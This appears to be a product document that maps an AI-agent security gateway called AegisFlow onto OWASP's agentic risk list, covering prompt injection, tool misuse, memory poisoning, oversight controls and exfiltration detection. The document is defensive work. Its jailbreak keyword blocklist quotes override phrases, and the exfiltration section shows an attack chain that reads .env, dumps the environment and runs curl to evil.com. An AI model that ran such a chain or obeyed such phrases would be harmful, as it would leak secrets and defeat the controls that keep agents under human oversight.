# AegisFlow OWASP Agentic Application Mapping

**Version:** 1.0
**Date:** 2026-04-06
**Reference:** [OWASP Top 10 for Agentic Applications 2026](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)

---

## Overview

This document maps each item in the OWASP Top 10 for Agentic Applications to the specific controls AegisFlow provides. For each risk, we describe the threat, the AegisFlow mitigation, and how to verify it.

---

## Mapping Summary

| OWASP Agentic Risk | AegisFlow Mitigation | Verification |
|---------------------|---------------------|--------------|
| A01: Prompt Injection | Input policy engine, keyword/regex/PII filters | `attack_demo.sh` Scenario A |
| A02: Tool Misuse | Tool policy engine, allowlist/denylist, review path | `attack_demo.sh` Scenarios B-E |
| A03: Excessive Agency | TaskManifest, drift detection, max action limits | Drift detection tests |
| A04: Lack of Oversight | Approval queue, behavioral monitoring, kill switch | Admin API approval endpoints |
| A05: Memory Poisoning | Evidence chain integrity, hash verification | `aegisctl evidence verify` |
| A06: Insufficient Logging | SHA-256 hash chain audit, session evidence, provenance | Evidence export + verify CLI |
| A07: Third-Party Risk | Supply chain signing, trust tiers, strict mode | Signed policy pack loading |
| A08: Data Exfiltration | Behavioral detection, shell sandbox, network policy | `attack_demo.sh` Scenario F |
| A09: Insufficient Access Control | Capability tickets, RBAC, separation of duties | RBAC enforcement tests |
| A10: Unrestricted Autonomy | Resource model, environment-aware policy, review path | Policy pack evaluation |

---

## Detailed Mappings

### A01: Prompt Injection

**OWASP description:** Attackers manipulate agent behavior through crafted inputs that override system instructions, causing the agent to perform unintended actions.

**AegisFlow controls:**

1. **Input policy engine** evaluates every request before it reaches the agent or upstream provider
2. **Keyword blocklist** detects known injection patterns ("ignore previous instructions", "ignore all instructions", "DAN mode")
3. **Regex pattern matching** catches structural injection attempts
4. **PII detection** identifies sensitive data patterns (SSN, email, credit card) in inputs
5. **Per-policy actions** allow graduated response: `allow`, `warn`, `block`
6. **WASM policy plugins** enable custom detection logic in any language that compiles to WebAssembly

**Configuration example:**
```yaml
policies:
  input:
    - name: "block-jailbreak"
      type: "keyword"
      action: "block"
      keywords:
        - "ignore previous instructions"
        - "ignore all instructions"
        - "DAN mode"
```

**Verification:** Run `./scripts/attack_demo.sh` Scenario A (Prompt Redirection Attack).

---

### A02: Tool Misuse

**OWASP description:** Agents call tools in unintended or harmful ways, either through manipulation or misconfiguration.

**AegisFlow controls:**

1. **Tool allowlist/denylist** per policy pack controls which tools an agent can invoke
2. **Protocol-aware policy** evaluates tool calls in context (MCP, shell, SQL, Git, HTTP)
3. **Capability-based decisions** distinguish read, write, delete, deploy, and approve operations
4. **Three policy packs** ship by default:
   - `coding-agent-strict`: blocks all destructive ops, reviews all writes, allows reads
   - `coding-agent-readonly`: allows only read operations
   - `coding-agent-permissive`: allows reads and writes, blocks destructive operations
5. **Review path** escalates ambiguous or sensitive tool calls to human operators

**Configuration example:**
```yaml
rules:
  - protocol: "sql"
    tool: "*"
    capability: delete
    decision: block

  - protocol: "git"
    tool: "git.force_push"
    decision: block
```

**Verification:** Run `./scripts/attack_demo.sh` Scenarios B-E (Dangerous Shell Commands, GitHub Mutations, Destructive SQL, Sensitive API Access).

---

### A03: Excessive Agency

**OWASP description:** Agents are granted more capabilities than necessary for their declared task, or they expand their own scope during execution.

**AegisFlow controls:**

1. **TaskManifest** declares expected tools, resources, write domains, max action count, and max budget before execution begins
2. **Drift detection** continuously compares actual execution against the manifest
3. **Session risk score** accumulates when actions fall outside declared scope
4. **Max action limits** prevent runaway sessions
5. **Kill switch** auto-terminates sessions that exceed risk thresholds
6. **Default-deny policy** in strict mode: anything not explicitly allowed is blocked

**Verification:** Submit a TaskManifest declaring read-only scope, then attempt a write operation. Drift detection flags the deviation.

---

### A04: Lack of Oversight

**OWASP description:** Agents operate without adequate human supervision, making consequential decisions autonomously.

**AegisFlow controls:**

1. **Approval queue** holds review-required actions until a human operator approves or denies them
2. **Admin API endpoints** for listing, approving, and denying pending actions (`/admin/v1/approvals`)
3. **`aegisctl approve` / `aegisctl deny`** CLI commands for operator workflow
4. **Behavioral monitoring** detects suspicious action sequences in real time
5. **Kill switch** allows operators to immediately terminate any session
6. **GraphQL admin API** provides programmatic access to approval workflows
7. **Webhook notifications** with HMAC-SHA256 signing alert external systems

**Verification:** Submit an action that matches a `review` policy rule. Confirm it appears in the approval queue and does not execute until approved.

---

### A05: Memory Poisoning

**OWASP description:** Attackers corrupt the agent's context, memory, or retrieved information to influence future decisions.

**AegisFlow controls:**

1. **Evidence chain integrity** ensures the historical record of actions cannot be silently modified
2. **SHA-256 hash chain** links every record to the previous one, making tampering detectable
3. **`aegisctl evidence verify`** CLI validates the entire chain and reports any breaks
4. **Session manifests** record the ordered sequence of actions per session
5. **Policy decisions are recorded** in the evidence chain, not just in logs, so the basis for each decision is preserved

**Verification:** Export a session's evidence, modify one record, run `aegisctl evidence verify`, and confirm tamper detection reports the break.

---

### A06: Insufficient Logging

**OWASP description:** Agent actions are not adequately recorded, making it impossible to investigate incidents or prove compliance.

**AegisFlow controls:**

1. **SHA-256 hash-chained audit log** with append-only writes records every action
2. **Session evidence** includes the complete action sequence, policy decisions, approval records, and credential issuance
3. **Evidence export** produces verifiable bundles with integrity metadata
4. **Provenance tracking** records which policy matched, which rule triggered, and why
5. **OpenTelemetry traces** provide per-request spans for operational debugging
6. **Prometheus metrics** at `/metrics` for monitoring and alerting
7. **Structured JSON logging** via Zap for log aggregation

**Evidence chain record includes:**
- Action ID and timestamp
- Actor identity (user, agent, session)
- Tool, target, and capability
- Policy decision and matched rule
- Approval record (if applicable)
- Credential issuance record (if applicable)
- Hash pointer to previous record

**Verification:** Run a governance demo session, export evidence with `aegisctl evidence export`, verify with `aegisctl evidence verify`.

---

### A07: Third-Party Risk

**OWASP description:** Agents rely on third-party tools, plugins, or services that may be compromised or behave unexpectedly.

**AegisFlow controls:**

1. **Signed policy packs** with signature verification at load time
2. **Trust tiers** for connectors and plugins (verified, community, untrusted)
3. **Strict mode** rejects unsigned or unverified extensions entirely
4. **WASM plugin sandbox** (wazero) limits plugin access to host resources
5. **Plugin provenance metadata** tracks origin, author, and version
6. **Compatibility contracts** prevent plugins from silently changing behavior across versions
7. **`aegisctl` plugin marketplace** with visibility into trust status

**Verification:** Attempt to load an unsigned policy pack in strict mode. Confirm it is rejected with an appropriate error.

---

### A08: Data Exfiltration

**OWASP description:** Agents read sensitive data and transmit it to unauthorized destinations.

**AegisFlow controls:**

1. **Behavioral detection** identifies exfiltration patterns (read sensitive file, then outbound HTTP POST)
2. **Shell sandbox** with environment variable redaction prevents secrets from leaking through env
3. **Network egress policy** restricts which external hosts the agent can contact
4. **Tool policy** blocks access to sensitive file paths (.env, /etc/shadow, credential files)
5. **PII stripping** removes sensitive patterns from responses
6. **HTTP host allowlist** limits outbound API access to declared destinations

**Attack chain detected:**
```
1. shell.cat .env          -> BLOCKED (sensitive file)
2. shell.printenv           -> BLOCKED (env dump)
3. shell.curl evil.com      -> BLOCKED (unauthorized destination)
```

**Verification:** Run `./scripts/attack_demo.sh` Scenario F (Credential Theft Attempt).

---

### A09: Insufficient Access Control

**OWASP description:** Agents operate with overly broad permissions, or access control is not enforced consistently across all tool types.

**AegisFlow controls:**

1. **Capability tickets** bind credentials to a specific action, resource, and time window
2. **RBAC** with three-role hierarchy (admin, operator, viewer) for the control plane
3. **Separation of duties** ensures policy authors cannot approve their own policies
4. **Per-protocol policy evaluation** enforces access control consistently across MCP, shell, SQL, Git, and HTTP
5. **Task-scoped credentials** replace inherited user tokens with short-lived, least-privilege access
6. **Environment-aware policies** differentiate between dev, staging, and production

**Verification:** Attempt to approve an action with a viewer-role API key. Confirm it is denied with 403 Forbidden.

---

### A10: Unrestricted Autonomy

**OWASP description:** Agents operate with no meaningful boundaries on what they can do, how much they can do, or how long they can operate.

**AegisFlow controls:**

1. **Resource model** with typed resources (repo, branch, table, schema, host, endpoint) scopes what agents can access
2. **Environment-aware policy inheritance** applies different rules in dev vs. staging vs. production
3. **Review path** requires human approval for write and deploy operations
4. **Max action count** limits how many actions a session can perform
5. **Session time budget** and credential TTL limit how long an agent can operate
6. **Default-deny** in strict mode ensures agents can only do what is explicitly permitted

**Verification:** Configure a strict policy pack, submit more actions than the max action limit, and confirm the session is terminated.

---

## Coverage Assessment

| OWASP Risk | Control Depth | Notes |
|------------|--------------|-------|
| A01: Prompt Injection | Strong | Multi-layer detection; WASM extensible |
| A02: Tool Misuse | Strong | Protocol-native enforcement across 5 types |
| A03: Excessive Agency | Strong | TaskManifest + drift detection is a key differentiator |
| A04: Lack of Oversight | Strong | Approval queue with CLI, API, and GraphQL interfaces |
| A05: Memory Poisoning | Moderate | Evidence integrity strong; agent memory itself is out of scope |
| A06: Insufficient Logging | Strong | Hash-chained evidence exceeds typical logging |
| A07: Third-Party Risk | Strong | Signed bundles + trust tiers + strict mode |
| A08: Data Exfiltration | Strong | Behavioral detection + sandbox + network policy |
| A09: Insufficient Access Control | Strong | Capability tickets + RBAC + separation of duties |
| A10: Unrestricted Autonomy | Strong | Resource model + environment-aware policy + limits |
